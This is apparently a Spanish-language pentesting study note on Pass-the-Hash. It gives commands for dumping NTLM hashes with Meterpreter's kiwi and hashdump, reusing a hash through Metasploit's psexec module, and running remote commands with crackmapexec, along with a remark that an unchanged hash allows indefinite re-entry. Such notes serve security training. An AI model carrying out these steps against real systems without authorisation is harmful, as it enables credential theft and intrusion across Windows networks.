**Pass-the-Hash** es una técnica de post-explotación que permite a un atacante autenticarse en un servidor o servicio remoto utilizando el **hash NTLM** subyacente de la contraseña de un usuario, en lugar de la contraseña en texto claro. Esto es posible porque el protocolo de autenticación de Windows no requiere la contraseña real para validar la identidad, sino solo su representación criptográfica (el hash).
## 🛡️ Notas de Persistencia

- **Uso:** El Pass-the-Hash es ideal cuando no puedes crackear una contraseña compleja pero ya tienes el hash.
- **Persistencia:** Si el usuario no cambia su contraseña, el hash seguirá siendo válido indefinidamente, permitiéndote re-entrar al sistema en cualquier momento.

---
## 🛠️ Fase 1: Obtención de Hashes (Dumping)
Para realizar un PtH, primero debemos extraer los hashes de la memoria o del archivo SAM de la víctima. Se requiere una sesión de [[Meterpreter]] con privilegios de Administrador o `SYSTEM`.

En la sesión de [[Meterpreter]]
### Usando el módulo Kiwi ([[Mimikatz]])

1. **Cargar extensión:** `load kiwi`
2. **Extraer hashes de la SAM:** Comando `lsa_dump_sam`. _Este comando extrae los hashes almacenados localmente en el sistema._

![[Imagenes/NTLMHashKiwi.png]]

- 3. **Comando nativo de [[Meterpreter]]:** `hashdump`. _Muestra los hashes en el formato estándar: `Username:RID:LM-Hash:NTLM-Hash:::`._

![[Imagenes/HashDumpKiwi.png]]

## 🚀 Fase 2: Ejecución del Ataque
Una vez tenemos el hash, no necesitamos crackearlo; podemos "pasarlo" directamente.
### A. Movimiento Lateral con [[Metasploit]]
Utilizamos el módulo **psexec** para obtener una nueva sesión en otra máquina (o la misma) usando el hash.

1. **Módulo:** `use exploit/windows/smb/psexec`
2. **Configuración crítica:**
    - `set SMBUser <Usuario>`
    - `set SMBPass <LMhash:NThash>` (Ejemplo imagenes: `aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d`)
    - `set RHOSTS <IP_Objetivo>`

> [!tip] **Consejo Pro:** Usa el hash completo extraído con `hashdump` (incluyendo la parte de LM vacía `aad3...404ee`). Si el exploit falla, intenta cambiar el **Target** de PowerShell a Command o Native.

![[Imagenes/TargetsPsexec.png]]

### B. Ejecución Remota con [[Crackmapexec]]

Es la herramienta más eficiente para verificar el hash en múltiples máquinas o ejecutar comandos rápidos.

**1. Verificar validez del hash:** `crackmapexec smb <IP> -u <usuario> -H "<hash_NTLM>"` _Si el hash es válido y el usuario tiene privilegios de administrador, aparecerá la etiqueta **(Pwn3d!)**._

![[Imagenes/crackmapexecPwnd.png]]

**2. Ejecución de comandos:** `crackmapexec smb <IP> -u <usuario> -H "<hash_NTLM>" -x "<comando>"` _Ejemplo: `-x "whoami"` o `-x "ipconfig"`._

![[Imagenes/crackmapexecComando.png]]

---
**Navegación:**
- [[Técnicas]]